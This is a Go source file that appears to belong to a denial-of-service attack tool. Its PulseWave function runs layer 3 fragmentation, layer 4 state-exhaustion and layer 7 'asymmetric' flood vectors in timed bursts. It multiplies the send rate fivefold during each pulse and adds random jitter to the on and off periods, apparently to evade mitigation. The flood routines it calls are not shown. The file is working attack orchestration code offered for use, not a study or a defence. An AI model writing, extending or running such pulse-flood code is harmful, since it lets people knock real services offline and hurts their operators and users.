package core

import (
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"
)

func PulseWave(st *EngineState, stopOuter <-chan struct{}) error {
	cfg := st.Wave

	fmt.Printf("[WAVE] vectors=%v on=%s off=%s jitter=%s\n",
		cfg.Vectors, cfg.PulseOn, cfg.PulseOff, cfg.Jitter)

	for {
		// snapshot config để restore sau pulse
		savedL3 := st.L3
		savedL4 := st.L4

		// ép burst + tăng rate tạm thời cho pulse
		st.L3.Flood = FloodBurst
		st.L4.Flood = FloodBurst
		// burst x5 rate để bung thật
		if st.L3.Rate > 0 {
			st.L3.Rate *= 5
		}
		if st.L4.Rate > 0 {
			st.L4.Rate *= 5
		}

		stop := make(chan struct{})
		var wg sync.WaitGroup

		active := make([]string, 0, len(cfg.Vectors))
		for _, v := range cfg.Vectors {
			v = strings.TrimSpace(v)
			if v == "" {
				continue
			}
			active = append(active, v)
			wg.Add(1)
			go func(vector string) {
				defer wg.Done()
				runVector(st, vector, stop)
			}(v)
		}

		on := cfg.PulseOn + jitterDur(cfg.Jitter)
		fmt.Printf("\n[WAVE] >>> ON %s | vectors=%v\n", on, active)

		select {
		case <-time.After(on):
		case <-stopOuter:
			close(stop)
			wg.Wait()
			restoreWave(st, savedL3, savedL4)
			return nil
		}

		close(stop)
		wg.Wait()
		restoreWave(st, savedL3, savedL4)

		off := cfg.PulseOff + jitterDur(cfg.Jitter)
		fmt.Printf("\n[WAVE] <<< OFF %s\n", off)

		select {
		case <-time.After(off):
		case <-stopOuter:
			return nil
		}
	}
}

func restoreWave(st *EngineState, l3 L3Config, l4 L4Config) {
	st.L3 = l3
	st.L4 = l4
}

func jitterDur(j time.Duration) time.Duration {
	if j <= 0 {
		return 0
	}
	// jitter ±j/2
	half := int64(j) / 2
	if half <= 0 {
		return 0
	}
	return time.Duration(rand.Int63n(half)) - time.Duration(half/2)
}

func runVector(st *EngineState, vector string, stop <-chan struct{}) {
	switch vector {
	case "l3", "l3-frag":
		if err := L3Fragment(st, stop); err != nil {
			fmt.Printf("[WAVE-L3] error: %v\n", err)
		}
	case "l4", "l4-state":
		if err := L4State(st, stop); err != nil {
			fmt.Printf("[WAVE-L4] error: %v\n", err)
		}
	case "l7", "l7-heavy":
		if err := L7Asymmetric(st, stop); err != nil {
			fmt.Printf("[WAVE-L7] error: %v\n", err)
		}
	default:
		fmt.Printf("[WAVE] Unsupported vector: %s\n", vector)
	}
}